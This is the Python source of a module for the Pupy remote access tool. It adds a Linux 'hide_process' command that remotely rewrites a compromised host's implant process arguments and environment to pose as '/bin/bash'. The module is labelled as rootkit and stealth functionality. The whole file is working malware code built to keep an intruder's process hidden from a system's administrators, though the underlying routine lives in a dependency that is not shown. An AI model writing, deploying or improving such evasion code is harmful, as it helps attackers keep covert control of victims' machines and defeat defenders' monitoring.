# -*- coding: utf-8 -*-
from pupylib.PupyModule import *

__class_name__="HideProcessModule"

@config(compat="linux", cat="manage", tags=["hide", "rootkit", "stealth"])
class HideProcessModule(PupyModule):
    """ Edit current process argv & env not to look suspicious """
    dependencies=["pupystealth"]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="hide_process", description=cls.__doc__)
        cls.arg_parser.add_argument('--argv', default="/bin/bash", help='change the new process argv')

    def run(self, args):
        change_argv = self.client.remote('pupystealth.change_argv', 'change_argv')

        change_argv(argv=args.argv)
        self.success("process argv and env changed !")
